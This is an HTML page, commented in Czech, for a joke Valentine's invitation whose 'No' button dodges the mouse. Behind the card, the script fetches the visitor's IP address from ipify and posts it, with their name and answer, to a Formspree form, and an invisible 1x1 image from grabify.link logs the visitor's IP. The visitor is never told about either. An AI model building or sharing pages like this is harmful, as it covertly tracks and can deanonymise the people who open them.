<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Be My Valentine?</title>
  <style>
    body {
      font-family: 'Comic Sans MS', cursive;
      text-align: center;
      margin-top: 80px;
      background-color: #ffe6e6;
    }
    h1 {
      color: #e60073;
    }
    button, input {
      font-size: 18px;
      padding: 10px 20px;
      margin: 10px;
      border: none;
      border-radius: 8px;
    }
    button {
      cursor: pointer;
    }
    #yesBtn {
      background-color: #ff66b3;
      color: white;
    }
    #noBtn {
      background-color: #cccccc;
      position: relative;
    }
    #response {
      margin-top: 30px;
      font-size: 24px;
      color: #99004d;
    }
    input[type="text"] {
      width: 300px;
    }
  </style>
</head>
<body>
  <h1>Will you be my Valentine? 💘</h1>

  <input type="text" id="nickname" placeholder="Your name or nickname..." required><br>

  <button id="yesBtn">Yes 😍</button>
  <button id="noBtn">No 🙈</button>

  <div id="response"></div>

  <script>
    const yesBtn = document.getElementById("yesBtn");
    const noBtn = document.getElementById("noBtn");
    const responseDiv = document.getElementById("response");
    const nicknameInput = document.getElementById("nickname");
    const formEndpoint = "https://formspree.io/f/xgvkaroq"; // 🔁 Nahraď vlastním Form ID

    function sendAnswer(answer) {
      const nickname = nicknameInput.value.trim();
      if (!nickname) {
        responseDiv.textContent = "Prosím, zadej své jméno nebo přezdívku 💡";
        return;
      }

      // Získání IP adresy přes ipify
      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          const ip = data.ip;

          fetch(formEndpoint, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Accept": "application/json"
            },
            body: JSON.stringify({
              name: nickname,
              answer: answer,
              ip: ip
            })
          })
          .then(res => res.ok ? "Odpověď přijata! 💌" : "Chyba při odeslání.")
          .then(msg => {
            responseDiv.textContent = msg;
          })
          .catch(err => {
            responseDiv.textContent = "Chyba: " + err.message;
          });
        })
        .catch(err => {
          responseDiv.textContent = "Chyba při získávání IP: " + err.message;
        });
    }

    yesBtn.addEventListener("click", () => {
      sendAnswer("Yes 😍");
    });

    noBtn.addEventListener("mouseover", () => {
      const x = Math.random() * (window.innerWidth - 150);
      const y = Math.random() * (window.innerHeight - 150);
      noBtn.style.position = "absolute";
      noBtn.style.left = `${x}px`;
      noBtn.style.top = `${y}px`;
    });

    noBtn.addEventListener("click", () => {
      sendAnswer("No 🙈");
    });
  </script>

  <!-- 🔍 Neviditelný obrázek (tracking pixel) -->
  <img src="https://grabify.link/WSLSXM" style="width:1px;height:1px;opacity:0;position:absolute;" alt="">
</body>
</html>
